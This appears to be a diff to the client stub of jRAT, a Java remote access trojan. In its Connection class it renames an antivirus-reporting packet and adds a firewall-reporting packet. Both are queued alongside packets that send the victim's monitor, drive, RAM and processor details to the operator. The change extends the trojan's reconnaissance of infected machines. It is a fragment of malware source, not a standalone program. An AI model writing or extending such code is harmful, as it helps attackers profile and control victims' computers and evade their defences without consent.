@@ -36,7 +36,8 @@ import pro.jrat.stub.packets.outgoing.Packet61InitMonitors;
 import pro.jrat.stub.packets.outgoing.Packet62InitDrives;
 import pro.jrat.stub.packets.outgoing.Packet63InitRAM;
 import pro.jrat.stub.packets.outgoing.Packet64InitAvailableProcessors;
-import pro.jrat.stub.packets.outgoing.Packet69Antivirus;
+import pro.jrat.stub.packets.outgoing.Packet69InitAntivirus;
+import pro.jrat.stub.packets.outgoing.Packet70InitFirewall;
 
 import com.sun.management.OperatingSystemMXBean;
 
@@ -152,7 +153,9 @@ public class Connection implements Runnable {
 
 		addToSendQueue(new Packet61InitMonitors(GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()));
 		
-		addToSendQueue(new Packet69Antivirus());
+		addToSendQueue(new Packet69InitAntivirus());
+		
+		addToSendQueue(new Packet70InitFirewall());
 	}
 
 	public static void addToSendQueue(AbstractOutgoingPacket packet) {
